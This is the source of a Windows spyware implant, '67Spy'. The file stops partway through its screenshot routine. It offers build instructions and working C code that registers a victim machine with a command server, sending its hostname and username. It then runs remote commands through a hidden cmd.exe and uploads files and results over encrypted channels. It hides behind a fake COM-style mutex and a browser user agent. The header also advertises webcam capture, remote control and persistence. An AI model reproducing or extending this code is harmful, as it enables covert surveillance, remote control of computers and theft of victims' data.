/*
 * 67Spy implant — Windows x64
 * C11 | BCrypt AES-256-GCM | HMAC-SHA256 | WinINet beaconing
 * GDI screenshot | avicap32 webcam | SendInput remote control
 * HKCU Run persistence — installed only after successful registration
 *
 * Build (MSVC + CMake):
 *   cmake -B build -DCMAKE_BUILD_TYPE=Release
 *   cmake --build build --config Release
 *   -> build\Release\implant.exe
 *
 * Cross-compile (MinGW on Linux):
 *   sudo apt install mingw-w64 cmake
 *   cmake -B build -DCMAKE_BUILD_TYPE=Release \
 *         -DCMAKE_TOOLCHAIN_FILE=../mingw-toolchain.cmake
 *   cmake --build build
 *
 * Built by Olivia — https://discord.gg/ojailbreaks
 */

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <wininet.h>
#include <bcrypt.h>
#include <vfw.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

/* ── configuration ─────────────────────────────────────────────────────────
 * Fill HOST, MASTER_AES_HEX, MASTER_HMAC_HEX before compile.
 * Keys must be exactly 64 lowercase hex chars matching AES_KEY / HMAC_KEY
 * environment variables set on the server.
 */
#define HOST        "FILL_HOST_HERE"          /* e.g. yourapp.railway.app */
#define PORT        443
#define USE_TLS     1                          /* 1 = HTTPS, 0 = plain HTTP */

static const char MASTER_AES_HEX[65]  =
    "0000000000000000000000000000000000000000000000000000000000000000";
static const char MASTER_HMAC_HEX[65] =
    "0000000000000000000000000000000000000000000000000000000000000000";

#define BEACON_MS        5000
#define BEACON_JITTER_MS 2000
#define SHELL_TIMEOUT_MS 15000
#define MAX_OUTPUT       (1 * 1024 * 1024)
#define MAX_UPLOAD_BYTES (35 * 1024 * 1024)   /* ~47 MB wire after AES+b64 */
#define INET_TIMEOUT_MS  10000
#define PROTO_VER        "2"

/* Single-instance mutex: looks like a legitimate COM GUID */
#define MUTEX_NAME "{A3F2C1D8-4E7B-11EF-9A2B-0242AC130003}"

/* ── types ──────────────────────────────────────────────────────────────── */
typedef unsigned char  u8;
typedef unsigned int   u32;

/* ── globals ────────────────────────────────────────────────────────────── */
static char  g_uuid[37];
static u8    g_aes_key[32];
static u8    g_hmac_key[32];
static DWORD g_sleep_ms = BEACON_MS;

/* ── hex helpers ─────────────────────────────────────────────────────────── */
static void hex_encode(const u8 *in, size_t len, char *out) {
    static const char h[] = "0123456789abcdef";
    for (size_t i = 0; i < len; i++) {
        out[2*i]   = h[in[i] >> 4];
        out[2*i+1] = h[in[i] & 0xf];
    }
    out[2*len] = 0;
}

static int is_hex_char(char c) {
    return (c >= '0' && c <= '9') ||
           (c >= 'a' && c <= 'f') ||
           (c >= 'A' && c <= 'F');
}

/* Returns 0 on success, -1 on invalid chars or odd length. */
static int hex_decode(const char *in, size_t hexlen, u8 *out) {
    if (!in || (hexlen & 1)) return -1;
    for (size_t i = 0; i < hexlen; i++)
        if (!is_hex_char(in[i])) return -1;
    for (size_t i = 0; i < hexlen / 2; i++) {
        char hi = in[2*i], lo = in[2*i+1];
        u8 h2 = (hi >= 'a') ? (u8)(hi-'a'+10) : (hi >= 'A') ? (u8)(hi-'A'+10) : (u8)(hi-'0');
        u8 l2 = (lo >= 'a') ? (u8)(lo-'a'+10) : (lo >= 'A') ? (u8)(lo-'A'+10) : (u8)(lo-'0');
        out[i] = (u8)((h2 << 4) | l2);
    }
    return 0;
}

/* Validate a hex key: exactly expected_len hex chars, not all-zero. */
static int validate_hex_key(const char *k, size_t expected_len) {
    if (!k || strlen(k) != expected_len) return -1;
    for (size_t i = 0; i < expected_len; i++)
        if (!is_hex_char(k[i])) return -1;
    int nonzero = 0;
    for (size_t i = 0; i < expected_len; i++)
        if (k[i] != '0') { nonzero = 1; break; }
    return nonzero ? 0 : -1;
}

/* ── base64 encode / decode ──────────────────────────────────────────────── */
static const char B64_CHARS[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/*
 * Encode `in_len` bytes → NUL-terminated base64 string.
 * out must hold at least ((in_len+2)/3)*4 + 1 bytes.
 */
static void b64_encode(const u8 *in, size_t in_len, char *out, size_t *out_len) {
    size_t i = 0, j = 0;
    for (; i + 2 < in_len; i += 3) {
        out[j++] = B64_CHARS[in[i]   >> 2];
        out[j++] = B64_CHARS[((in[i]   & 0x03) << 4) | (in[i+1] >> 4)];
        out[j++] = B64_CHARS[((in[i+1] & 0x0f) << 2) | (in[i+2] >> 6)];
        out[j++] = B64_CHARS[  in[i+2] & 0x3f];
    }
    if (i < in_len) {
        out[j++] = B64_CHARS[in[i] >> 2];
        if (i + 1 < in_len) {
            out[j++] = B64_CHARS[((in[i]   & 0x03) << 4) | (in[i+1] >> 4)];
            out[j++] = B64_CHARS[ (in[i+1] & 0x0f) << 2];
        } else {
            out[j++] = B64_CHARS[(in[i] & 0x03) << 4];
            out[j++] = '=';
        }
        out[j++] = '=';
    }
    out[j] = 0;
    if (out_len) *out_len = j;
}

/*
 * Decode base64 string → binary.  Returns 0 on success, -1 on error.
 * out must hold at least ((in_len/4)+1)*3 bytes.
 */
static int b64_decode(const char *in, size_t in_len, u8 *out, size_t *out_len) {
    static const signed char T[256] = {
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
        52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-2,-1,-1,
        -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
        15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
        -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
        41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1
    };
    size_t j = 0;
    u8 buf[4];
    int n = 0;
    for (size_t i = 0; i < in_len; i++) {
        unsigned char c = (unsigned char)in[i];
        signed char v = (c < 128) ? T[c] : -1;
        if (v == -1) continue;
        if (v == -2) {
            if (n == 2) { out[j++] = (u8)((buf[0] << 2) | (buf[1] >> 4)); }
            else if (n == 3) {
                out[j++] = (u8)((buf[0] << 2) | (buf[1] >> 4));
                out[j++] = (u8)((buf[1] << 4) | (buf[2] >> 2));
            }
            break;
        }
        buf[n++] = (u8)v;
        if (n == 4) {
            out[j++] = (u8)((buf[0] << 2) | (buf[1] >> 4));
            out[j++] = (u8)((buf[1] << 4) | (buf[2] >> 2));
            out[j++] = (u8)((buf[2] << 6) |  buf[3]);
            n = 0;
        }
    }
    if (n == 2) { out[j++] = (u8)((buf[0] << 2) | (buf[1] >> 4)); }
    else if (n == 3) {
        out[j++] = (u8)((buf[0] << 2) | (buf[1] >> 4));
        out[j++] = (u8)((buf[1] << 4) | (buf[2] >> 2));
    }
    *out_len = j;
    return 0;
}
#define B64_DECODE_BOUND(n) (((n) / 4) * 3 + 4)

/* ── URL-encode filename ─────────────────────────────────────────────────── */
static void url_encode_filename(const char *in, char *out, size_t cap) {
    static const char HEX[] = "0123456789ABCDEF";
    size_t j = 0;
    for (size_t i = 0; in[i] && j + 4 < cap; i++) {
        unsigned char c = (unsigned char)in[i];
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9') || c == '-' || c == '_' ||
            c == '.' || c == '~') {
            out[j++] = (char)c;
        } else {
            out[j++] = '%';
            out[j++] = HEX[c >> 4];
            out[j++] = HEX[c & 0xf];
        }
    }
    out[j] = 0;
}

/* ── BCrypt AES-256-GCM ──────────────────────────────────────────────────── */
#define AES_KEY_LEN 32
#define IV_LEN      12
#define TAG_LEN     16

/*
 * Encrypt plain[0..plen) → out[] = IV(12) | ciphertext(plen) | tag(16)
 * out_cap must be >= plen + IV_LEN + TAG_LEN
 */
static int aes_gcm_encrypt(const u8 *key, const u8 *plain, size_t plen,
                             u8 *out, size_t *out_len) {
    BCRYPT_ALG_HANDLE alg  = NULL;
    BCRYPT_KEY_HANDLE hkey = NULL;
    int rc = -1;

    u8 iv[IV_LEN];
    BCryptGenRandom(NULL, iv, IV_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    memcpy(out, iv, IV_LEN);

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0)))
        goto done;
    if (!BCRYPT_SUCCESS(BCryptSetProperty(alg, BCRYPT_CHAINING_MODE,
                                          (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                                          sizeof(BCRYPT_CHAIN_MODE_GCM), 0)))
        goto done;
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(alg, &hkey, NULL, 0,
                                                   (PUCHAR)key, AES_KEY_LEN, 0)))
        goto done;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    BCRYPT_INIT_AUTH_MODE_INFO(info);
    info.pbNonce = iv;
    info.cbNonce = IV_LEN;
    info.pbTag   = out + IV_LEN + plen;
    info.cbTag   = TAG_LEN;

    ULONG written = 0;
    NTSTATUS st = BCryptEncrypt(hkey, (PUCHAR)plain, (ULONG)plen, &info,
                                NULL, 0, out + IV_LEN, (ULONG)plen, &written, 0);
    if (!BCRYPT_SUCCESS(st)) goto done;
    *out_len = IV_LEN + (size_t)written + TAG_LEN;
    rc = 0;
done:
    if (hkey) BCryptDestroyKey(hkey);
    if (alg)  BCryptCloseAlgorithmProvider(alg, 0);
    return rc;
}

/*
 * Decrypt in[] = IV(12) | ciphertext | tag(16) → out[]
 * out_cap must be >= in_len - IV_LEN - TAG_LEN
 */
static int aes_gcm_decrypt(const u8 *key, const u8 *in, size_t in_len,
                             u8 *out, size_t *out_len) {
    if (in_len < (size_t)(IV_LEN + TAG_LEN)) return -1;
    size_t ct_len = in_len - IV_LEN - TAG_LEN;

    BCRYPT_ALG_HANDLE alg  = NULL;
    BCRYPT_KEY_HANDLE hkey = NULL;
    int rc = -1;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0)))
        goto done;
    if (!BCRYPT_SUCCESS(BCryptSetProperty(alg, BCRYPT_CHAINING_MODE,
                                          (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                                          sizeof(BCRYPT_CHAIN_MODE_GCM), 0)))
        goto done;
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(alg, &hkey, NULL, 0,
                                                   (PUCHAR)key, AES_KEY_LEN, 0)))
        goto done;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    BCRYPT_INIT_AUTH_MODE_INFO(info);
    info.pbNonce = (PUCHAR)in;
    info.cbNonce = IV_LEN;
    info.pbTag   = (PUCHAR)(in + IV_LEN + ct_len);
    info.cbTag   = TAG_LEN;

    ULONG written = 0;
    NTSTATUS st = BCryptDecrypt(hkey, (PUCHAR)(in + IV_LEN), (ULONG)ct_len, &info,
                                NULL, 0, out, (ULONG)ct_len, &written, 0);
    if (!BCRYPT_SUCCESS(st)) goto done;
    *out_len = (size_t)written;
    rc = 0;
done:
    if (hkey) BCryptDestroyKey(hkey);
    if (alg)  BCryptCloseAlgorithmProvider(alg, 0);
    return rc;
}

/* ── HMAC-SHA256 ─────────────────────────────────────────────────────────── */
static int hmac_sha256(const u8 *key, size_t klen,
                        const u8 *msg, size_t mlen, u8 out[32]) {
    BCRYPT_ALG_HANDLE  alg  = NULL;
    BCRYPT_HASH_HANDLE hash = NULL;
    int rc = -1;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM,
                                                    NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG)))
        goto done;
    if (!BCRYPT_SUCCESS(BCryptCreateHash(alg, &hash, NULL, 0,
                                         (PUCHAR)key, (ULONG)klen, 0)))
        goto done;
    if (!BCRYPT_SUCCESS(BCryptHashData(hash, (PUCHAR)msg, (ULONG)mlen, 0)))
        goto done;
    if (!BCRYPT_SUCCESS(BCryptFinishHash(hash, out, 32, 0)))
        goto done;
    rc = 0;
done:
    if (hash) BCryptDestroyHash(hash);
    if (alg)  BCryptCloseAlgorithmProvider(alg, 0);
    return rc;
}

/* HMAC binary data → 64-char lowercase hex string + NUL */
static int sign_bytes(const u8 *hmac_key, const u8 *data, size_t dlen,
                       char out_hex[65]) {
    u8 mac[32];
    if (hmac_sha256(hmac_key, 32, data, dlen, mac) != 0) return -1;
    hex_encode(mac, 32, out_hex);
    return 0;
}

/* ── UUID v4 generation ──────────────────────────────────────────────────── */
static void gen_uuid(char out[37]) {
    u8 b[16];
    BCryptGenRandom(NULL, b, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    b[6] = (b[6] & 0x0f) | 0x40;
    b[8] = (b[8] & 0x3f) | 0x80;
    snprintf(out, 37,
        "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
        b[0],b[1],b[2],b[3], b[4],b[5], b[6],b[7],
        b[8],b[9], b[10],b[11],b[12],b[13],b[14],b[15]);
}

/* ── WinINet ──────────────────────────────────────────────────────────────── */
static HINTERNET g_inet = NULL;
static HINTERNET g_conn = NULL;

static int inet_init(void) {
    g_inet = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!g_inet) return -1;

    DWORD to = INET_TIMEOUT_MS;
    InternetSetOption(g_inet, INTERNET_OPTION_CONNECT_TIMEOUT, &to, sizeof(to));
    InternetSetOption(g_inet, INTERNET_OPTION_RECEIVE_TIMEOUT, &to, sizeof(to));
    InternetSetOption(g_inet, INTERNET_OPTION_SEND_TIMEOUT,    &to, sizeof(to));

    g_conn = InternetConnectA(g_inet, HOST, (INTERNET_PORT)PORT,
                               NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!g_conn) { InternetCloseHandle(g_inet); g_inet = NULL; return -1; }
    return 0;
}

static void inet_cleanup(void) {
    if (g_conn) { InternetCloseHandle(g_conn); g_conn = NULL; }
    if (g_inet) { InternetCloseHandle(g_inet); g_inet = NULL; }
}

/*
 * HTTP POST or GET.  Returns malloc'd NUL-terminated response in *resp_out.
 * Caller frees.  Returns 0 on HTTP 2xx, negative on error or non-2xx.
 */
static int http_request(const char *method, const char *path,
                         const char *content_type,
                         const u8 *body, size_t body_len,
                         u8 **resp_out, size_t *resp_len_out) {
    *resp_out     = NULL;
    *resp_len_out = 0;

    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
                  INTERNET_FLAG_NO_COOKIES;
    if (USE_TLS)
        flags |= INTERNET_FLAG_SECURE |
                 INTERNET_FLAG_IGNORE_CERT_REVOCATION |
                 INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;

    HINTERNET hreq = HttpOpenRequestA(g_conn, method, path,
                                       "HTTP/1.1", NULL, NULL, flags, 0);
    if (!hreq) return -1;

    char hdrs[256] = "";
    DWORD hdrs_len = (DWORD)-1;
    if (content_type)
        snprintf(hdrs, sizeof(hdrs), "Content-Type: %s\r\n", content_type);
    else
        hdrs_len = 0;

    BOOL ok = HttpSendRequestA(hreq,
                                content_type ? hdrs : NULL,
                                hdrs_len,
                                (LPVOID)body, (DWORD)body_len);
    if (!ok) { InternetCloseHandle(hreq); return -1; }

    DWORD status = 0, ssz = sizeof(status), idx = 0;
    HttpQueryInfoA(hreq, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                   &status, &ssz, &idx);
    if (status < 200 || status >= 300) {
        InternetCloseHandle(hreq);
        return -(int)status;
    }

    size_t cap = 8192, total = 0;
    u8 *buf = (u8*)malloc(cap);
    if (!buf) { InternetCloseHandle(hreq); return -1; }

    DWORD rd = 0;
    while (InternetReadFile(hreq, buf + total,
                            (DWORD)(cap - total - 1), &rd) && rd > 0) {
        total += rd;
        if (total + 1 >= cap) {
            cap = cap * 2 + 4096;
            u8 *nb = (u8*)realloc(buf, cap);
            if (!nb) { free(buf); InternetCloseHandle(hreq); return -1; }
            buf = nb;
        }
    }
    buf[total] = 0;
    InternetCloseHandle(hreq);
    *resp_out     = buf;
    *resp_len_out = total;
    return 0;
}

/* ── /reg ─────────────────────────────────────────────────────────────────
 *
 * Wire protocol (server is authoritative):
 *   Body (text/plain) = base64(nonce+ciphertext) + "\n" + sig_hex
 *   sig = HMAC-SHA256(master_hmac_key, binary_ciphertext)   ← NOT plaintext
 *   JSON payload = {"uuid":"...","hostname":"...","username":"...","os_info":"...","ver":"2"}
 *
 *   Response (text/plain) = base64(aes_encrypt(master_aes,
 *                                  {"per_aes":"<64hex>","per_hmac":"<64hex>"}))
 */
static int do_register(void) {
    u8 master_aes[32], master_hmac[32];
    if (hex_decode(MASTER_AES_HEX,  64, master_aes)  != 0) return -1;
    if (hex_decode(MASTER_HMAC_HEX, 64, master_hmac) != 0) return -1;

    /* collect sysinfo */
    char hostname[128] = "unknown";
    char username[128] = "unknown";
    char osinfo[256]   = "Windows";
    DWORD sz;

    sz = (DWORD)sizeof(hostname); GetComputerNameA(hostname, &sz);
    sz = (DWORD)sizeof(username); GetUserNameA(username, &sz);

    /* RtlGetVersion bypasses OS compatibility shim */
    typedef LONG (WINAPI *RtlGetVersion_t)(PRTL_OSVERSIONINFOW);
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        RtlGetVersion_t fn = (RtlGetVersion_t)GetProcAddress(ntdll, "RtlGetVersion");
        if (fn) {
            RTL_OSVERSIONINFOW vi = {0};
            vi.dwOSVersionInfoSize = sizeof(vi);
            if (fn(&vi) == 0)
                snprintf(osinfo, sizeof(osinfo), "Windows %lu.%lu.%lu",
                         vi.dwMajorVersion, vi.dwMinorVersion, vi.dwBuildNumber);
        }
    }

    /* JSON payload — "uuid" field and "ver" field match what server.py reads */
    char json[1024];
    size_t jlen = (size_t)snprintf(json, sizeof(json),
        "{\"uuid\":\"%s\",\"hostname\":\"%s\",\"username\":\"%s\","
        "\"os_info\":\"%s\",\"ver\":\"%s\"}",
        g_uuid, hostname, username, osinfo, PROTO_VER);

    /* 1. Encrypt with MASTER AES key */
    size_t ct_cap = jlen + IV_LEN + TAG_LEN + 8;
    u8 *ct = (u8*)malloc(ct_cap);
    if (!ct) return -1;
    size_t ct_len = 0;
    if (aes_gcm_encrypt(master_aes, (u8*)json, jlen, ct, &ct_len) != 0) {
        free(ct); return -1;
    }

    /* 2. HMAC over binary ciphertext (NOT plaintext) */
    char sig[65];
    if (sign_bytes(master_hmac, ct, ct_len, sig) != 0) { free(ct); return -1; }

    /* 3. base64-encode ciphertext for wire */
    size_t b64_cap = ((ct_len + 2) / 3) * 4 + 4;
    char *enc_b64 = (char*)malloc(b64_cap);
    if (!enc_b64) { free(ct); return -1; }
    size_t b64_len = 0;
    b64_encode(ct, ct_len, enc_b64, &b64_len);
    free(ct);

    /* 4. body = "<b64_blob>\n<sig_hex>" */
    size_t body_cap = b64_len + 68;
    char *body = (char*)malloc(body_cap);
    if (!body) { free(enc_b64); return -1; }
    size_t blen = (size_t)snprintf(body, body_cap, "%s\n%s", enc_b64, sig);
    free(enc_b64);

    u8 *resp = NULL; size_t rlen = 0;
    int rc = http_request("POST", "/reg", "text/plain",
                           (u8*)body, blen, &resp, &rlen);
    free(body);
    if (rc != 0 || !resp || rlen == 0) { if (resp) free(resp); return -1; }

    /* 5. decode response: base64decode → aes_decrypt(master_aes) → parse per_aes / per_hmac */
    size_t bin_cap = B64_DECODE_BOUND(rlen) + 4;
    u8 *bin = (u8*)malloc(bin_cap);
    int parsed = -1;
    if (bin) {
        size_t bin_len = 0;
        if (b64_decode((char*)resp, rlen, bin, &bin_len) == 0 && bin_len > 0) {
            u8 *plain = (u8*)malloc(bin_len + 1);
            size_t plain_len = 0;
            if (plain &&
                aes_gcm_decrypt(master_aes, bin, bin_len, plain, &plain_len) == 0) {
                plain[plain_len] = 0;
                /* extract "per_aes" and "per_hmac" hex strings */
                char aes_hex[65]  = {0};
                char hmac_hex[65] = {0};
                const char *p = strstr((char*)plain, "\"per_aes\":\"");
                if (p) { p += 11; strncpy(aes_hex,  p, 64); aes_hex[64]  = 0; }
                p = strstr((char*)plain, "\"per_hmac\":\"");
                if (p) { p += 12; strncpy(hmac_hex, p, 64); hmac_hex[64] = 0; }

                if (strlen(aes_hex)  == 64 && strlen(hmac_hex) == 64 &&
                    hex_decode(aes_hex,  64, g_aes_key)  == 0 &&
                    hex_decode(hmac_hex, 64, g_hmac_key) == 0) {
                    parsed = 0;
                }
            }
            if (plain) free(plain);
        }
        free(bin);
    }
    free(resp);
    return parsed;
}

/* ── /task ────────────────────────────────────────────────────────────────
 *
 * GET /task?id=<uuid>&sig=<hex>&ts=<unix>
 * sig = HMAC(per_hmac, uuid_string + ts_decimal_string)
 * Response (text/plain) = base64(aes_encrypt(per_aes, task_string))
 */
static char *fetch_task(void) {
    time_t ts = time(NULL);
    /* sig input: UUID concatenated with ts decimal — matches server: f"{uid}{ts}".encode() */
    char sig_input[80];
    size_t si_len = (size_t)snprintf(sig_input, sizeof(sig_input),
                                      "%s%lld", g_uuid, (long long)ts);
    char sig[65];
    if (sign_bytes(g_hmac_key, (u8*)sig_input, si_len, sig) != 0) return NULL;

    char path[320];
    snprintf(path, sizeof(path), "/task?id=%s&sig=%s&ts=%lld",
             g_uuid, sig, (long long)ts);

    u8 *resp = NULL; size_t rlen = 0;
    if (http_request("GET", path, NULL, NULL, 0, &resp, &rlen) != 0)
        return NULL;
    if (!resp || rlen == 0) { if (resp) free(resp); return NULL; }

    /* base64decode → aes_decrypt(per_aes) → task string */
    size_t bin_cap = B64_DECODE_BOUND(rlen) + 4;
    u8 *bin = (u8*)malloc(bin_cap);
    char *result = NULL;
    if (bin) {
        size_t bin_len = 0;
        if (b64_decode((char*)resp, rlen, bin, &bin_len) == 0 && bin_len > 0) {
            u8 *plain = (u8*)malloc(bin_len + 1);
            size_t plain_len = 0;
            if (plain &&
                aes_gcm_decrypt(g_aes_key, bin, bin_len, plain, &plain_len) == 0) {
                plain[plain_len] = 0;
                result = (char*)plain;
            } else {
                if (plain) free(plain);
            }
        }
        free(bin);
    }
    free(resp);
    return result; /* caller frees */
}

/* ── /result ──────────────────────────────────────────────────────────────
 *
 * encrypt(per_aes, raw_text) → HMAC(per_hmac, binary_ciphertext) → base64(ct)
 * body (application/json) = {"id":"<uuid>","sig":"<hex>","data":"<b64>","rtype":"<type>"}
 * rtype is in the OUTER unencrypted JSON — server reads body.get("rtype","shell")
 * inner plaintext is RAW text output — NOT JSON-wrapped
 */
static void post_result(const char *rtype, const char *output) {
    size_t olen = strlen(output);

    size_t ct_cap = olen + IV_LEN + TAG_LEN + 8;
    u8 *ct = (u8*)malloc(ct_cap);
    if (!ct) return;
    size_t ct_len = 0;
    if (aes_gcm_encrypt(g_aes_key, (u8*)output, olen, ct, &ct_len) != 0) {
        free(ct); return;
    }

    /* HMAC over binary ciphertext (NOT plaintext) */
    char sig[65];
    if (sign_bytes(g_hmac_key, ct, ct_len, sig) != 0) { free(ct); return; }

    /* base64-encode ciphertext */
    size_t b64_cap = ((ct_len + 2) / 3) * 4 + 4;
    char *enc_b64 = (char*)malloc(b64_cap);
    if (!enc_b64) { free(ct); return; }
    size_t b64_len = 0;
    b64_encode(ct, ct_len, enc_b64, &b64_len);
    free(ct);

    /* outer JSON: rtype in plaintext, data base64-encoded */
    size_t bsz = 64 + 64 + b64_len + strlen(rtype) + 32;
    char *body = (char*)malloc(bsz);
    if (!body) { free(enc_b64); return; }
    size_t blen = (size_t)snprintf(body, bsz,
        "{\"id\":\"%s\",\"sig\":\"%s\",\"data\":\"%s\",\"rtype\":\"%s\"}",
        g_uuid, sig, enc_b64, rtype);
    free(enc_b64);

    u8 *resp = NULL; size_t rlen = 0;
    http_request("POST", "/result", "application/json",
                  (u8*)body, blen, &resp, &rlen);
    free(body);
    if (resp) free(resp);
}

/* ── /upload/<uuid>/<filename> ───────────────────────────────────────────
 *
 * encrypt(per_aes, raw_bytes) → HMAC(per_hmac, binary_ct) → base64(ct)
 * body (application/json) = {"sig":"<hex>","data":"<b64>"}   (no "id" — cid in URL)
 * filename is percent-encoded in the URL path
 */
static void post_upload(const char *filename, const u8 *data, size_t data_len) {
    size_t ct_cap = data_len + IV_LEN + TAG_LEN + 8;
    u8 *ct = (u8*)malloc(ct_cap);
    if (!ct) return;
    size_t ct_len = 0;
    if (aes_gcm_encrypt(g_aes_key, data, data_len, ct, &ct_len) != 0) {
        free(ct); return;
    }

    /* HMAC over binary ciphertext */
    char sig[65];
    if (sign_bytes(g_hmac_key, ct, ct_len, sig) != 0) { free(ct); return; }

    /* base64-encode ciphertext */
    size_t b64_cap = ((ct_len + 2) / 3) * 4 + 4;
    char *enc_b64 = (char*)malloc(b64_cap);
    if (!enc_b64) { free(ct); return; }
    size_t b64_len = 0;
    b64_encode(ct, ct_len, enc_b64, &b64_len);
    free(ct);

    /* JSON body — no id field: cid lives in URL path */
    size_t bsz = 64 + b64_len + 16;
    char *body = (char*)malloc(bsz);
    if (!body) { free(enc_b64); return; }
    size_t blen = (size_t)snprintf(body, bsz,
        "{\"sig\":\"%s\",\"data\":\"%s\"}", sig, enc_b64);
    free(enc_b64);

    /* percent-encode filename for URL */
    char enc_fname[512];
    url_encode_filename(filename, enc_fname, sizeof(enc_fname));

    char path[600];
    snprintf(path, sizeof(path), "/upload/%s/%s", g_uuid, enc_fname);

    u8 *resp = NULL; size_t rlen = 0;
    http_request("POST", path, "application/json",
                  (u8*)body, blen, &resp, &rlen);
    free(body);
    if (resp) free(resp);
}

/* ── task key=value parser ───────────────────────────────────────────────── */
static const char *task_get(const char *task, const char *key) {
    static char val[4096];
    size_t klen = strlen(key);
    const char *p = task;
    while (*p) {
        if (strncmp(p, key, klen) == 0 && p[klen] == '=') {
            const char *v  = p + klen + 1;
            const char *nl = strchr(v, '\n');
            size_t vlen = nl ? (size_t)(nl - v) : strlen(v);
            if (vlen >= sizeof(val)) vlen = sizeof(val) - 1;
            memcpy(val, v, vlen);
            val[vlen] = 0;
            return val;
        }
        while (*p && *p != '\n') p++;
        if (*p == '\n') p++;
    }
    return NULL;
}

/* ── shell command execution ─────────────────────────────────────────────── */
typedef struct { HANDLE pipe_r; char *buf; DWORD cap; DWORD used; } ReadCtx;

static DWORD WINAPI pipe_reader(LPVOID arg) {
    ReadCtx *ctx = (ReadCtx*)arg;
    char tmp[4096];
    DWORD rd = 0;
    while (ReadFile(ctx->pipe_r, tmp, sizeof(tmp), &rd, NULL) && rd > 0) {
        if (ctx->used + rd < ctx->cap) {
            memcpy(ctx->buf + ctx->used, tmp, rd);
            ctx->used += rd;
        }
    }
    return 0;
}

static void task_shell(const char *cmd) {
    char cmdline[4096];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);

    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE pr, pw;
    if (!CreatePipe(&pr, &pw, &sa, 0)) {
        post_result("shell", "[pipe create failed]"); return;
    }
    SetHandleInformation(pr, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = {0};
    si.cb          = sizeof(si);
    si.hStdOutput  = pw;
    si.hStdError   = pw;
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                         CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pr); CloseHandle(pw);
        post_result("shell", "[process spawn failed]"); return;
    }
    CloseHandle(pw);

    ReadCtx *ctx = (ReadCtx*)calloc(1, sizeof(ReadCtx));
    ctx->buf    = (char*)calloc(1, (size_t)MAX_OUTPUT + 1);
    ctx->cap    = MAX_OUTPUT;
    ctx->pipe_r = pr;

    HANDLE reader = CreateThread(NULL, 0, pipe_reader, ctx, 0, NULL);
    WaitForSingleObject(pi.hProcess, SHELL_TIMEOUT_MS);
    TerminateProcess(pi.hProcess, 1);
    WaitForSingleObject(reader, 5000);
    CloseHandle(reader);

    ctx->buf[ctx->used] = 0;
    post_result("shell", ctx->used > 0 ? ctx->buf : "[no output]");

    free(ctx->buf);
    free(ctx);
    CloseHandle(pr);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

/* ── GDI screenshot: multi-monitor, overflow-safe ───────────────────────── */
static u8 *capture_screen(size_t *out_len) {
    HDC dc = GetDC(NULL);
    int w  = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int h  = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int x0 = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y0 = GetSystemMetrics(SM_YVIRTUALSCREEN);
    if (w <= 0 || h <= 0) { ReleaseDC(NULL, dc); return NULL; }

    HDC     mdc = CreateCompatibleDC(dc);
    HBITMAP bmp = CreateCompatibleBitmap(dc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, dc, x0, y0, SRCCOPY | CAPTUREBLT);

    BITMAPINFOHEADER bih = {0};
    bih.biSize        = sizeof(bih);
    bih.biWidth       = w;
    bih.biHeight      = -h;   /* top-down DIB */
    bih.biPlanes      = 1;
    bih.biBitCount    = 24;
    bih.biCompression = BI_RGB;

    /* overflow-safe: size_t multiplication with overflow guard */
    size_t rowbytes = (size_t)((((size_t)w * 3) + 3) & ~(size_t)3);
